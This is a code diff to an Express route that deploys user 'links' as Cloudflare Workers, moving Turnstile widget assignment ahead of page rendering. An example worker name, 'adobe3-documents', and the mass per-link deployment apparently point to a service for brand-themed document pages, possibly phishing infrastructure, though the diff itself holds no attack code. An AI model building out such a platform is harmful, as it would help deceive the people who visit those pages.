@@ -206,6 +206,39 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
         const templateLoader = require('../services/templateloader');
         const cloudflare = require('../services/cloudflare');
         const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
+
+        // Resolve the page hostname and assign the platform-owned Turnstile
+        // widget BEFORE the HTML is rendered.
+        //
+        // This ordering is load-bearing: renderPageHtml() -> buildWindowVars()
+        // calls getAssignedSiteKey(linkId) and bakes the result into the page
+        // as __TURNSTILE_SITE_KEY. If assignWidget() runs afterwards, the row
+        // does not exist yet at render time, the lookup falls back to the
+        // global env key (empty or a "CHANGE_ME_REQUIRED" placeholder), and
+        // vg-engine either skips the widget entirely or renders it with an
+        // invalid sitekey - so the challenge never appears and the visitor is
+        // let straight through.
+        //
+        // Turnstile authorizes a hostname AND every subdomain beneath it, and a
+        // widget is capped at 10 hostnames on the Free plan. So register the
+        // BASE domain once - it covers every link deployed on that account -
+        // instead of one entry per link, which would exhaust the cap after
+        // about ten links and silently break every link after that.
+        const cfWorkersSubdomain = normalizeWorkersSubdomain(
+          req.user.cf_workers_subdomain || config.CF_WORKERS_SUBDOMAIN
+        );
+        const turnstileHostname = custom_domain
+          ? String(custom_domain).replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase()
+          : cfWorkersSubdomain;   // e.g. "powerballranger.workers.dev"
+        try {
+          const turnstilePool = require('../services/turnstile-pool');
+          await turnstilePool.assignWidget(linkId, turnstileHostname).catch(err => {
+            console.warn('[Links] Turnstile pool assignment failed (non-fatal):', err.message);
+          });
+        } catch (tpErr) {
+          console.warn('[Links] Turnstile pool service error (non-fatal):', tpErr.message);
+        }
+
         const scriptContent = await templateLoader.buildWorkerScript({ ...req.body, id: linkId, custom_bg_url: custom_bg_url || null }, req.user, apiBaseUrl);
         const deployment = await cloudflare.deployWorker(
           scriptContent,
@@ -221,17 +254,15 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
         await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ?, custom_bg_url = ? WHERE id = ?',
           [deployment.workerName || worker_name, url_type, custom_domain || null, custom_bg_url || null, linkId]);
 
-        // Auto-add deployed worker domains to Turnstile whitelist.
+        // Auto-add deployed worker domains to the internal Turnstile whitelist.
         // cf_workers_subdomain is stored as the PREFIX only ("powerballranger"),
-        // not the full domain. Turnstile matches allowed origins by exact
-        // hostname, so the suffix must be present here - otherwise the origin
-        // that actually gets added ("adobe3-documents-8482.powerballranger")
-        // never matches the page's real origin
-        // ("...powerballranger.workers.dev"), and every challenge fails with a
-        // domain mismatch and the visitor is let straight through.
-        const cfWorkersSubdomain = normalizeWorkersSubdomain(
-          req.user.cf_workers_subdomain || config.CF_WORKERS_SUBDOMAIN
-        );
+        // not the full domain, so the suffix must be present here - otherwise
+        // the recorded origin ("adobe3-documents-8482.powerballranger") never
+        // matches the page's real origin ("...powerballranger.workers.dev").
+        //
+        // cfWorkersSubdomain / turnstileHostname were resolved BEFORE
+        // buildWorkerScript() above - see that block for why the ordering is
+        // load-bearing.
         try {
           const turnstileWhitelist = require('../services/turnstile-whitelist');
           await turnstileWhitelist.autoWhitelistWorker({
@@ -245,25 +276,6 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
           });
         } catch (twErr) {
           console.warn('[Links] Turnstile whitelist service error (non-fatal):', twErr.message);
-        }
-
-        // Assign a platform-owned Turnstile widget for this link.
-        //
-        // Turnstile authorizes a hostname AND every subdomain beneath it, and a
-        // widget is capped at 10 hostnames on the Free plan. So register the
-        // BASE domain once - it covers every link deployed on that account -
-        // instead of one entry per link, which would exhaust the cap after
-        // about ten links and silently break every link after that.
-        const hostname = custom_domain
-          ? String(custom_domain).replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase()
-          : cfWorkersSubdomain;   // e.g. "powerballranger.workers.dev"
-        try {
-          const turnstilePool = require('../services/turnstile-pool');
-          await turnstilePool.assignWidget(linkId, hostname).catch(err => {
-            console.warn('[Links] Turnstile pool assignment failed (non-fatal):', err.message);
-          });
-        } catch (tpErr) {
-          console.warn('[Links] Turnstile pool service error (non-fatal):', tpErr.message);
         }
       } catch (deployErr) {
         await db.query('UPDATE links SET status = ? WHERE id = ?', ['disabled', linkId]);
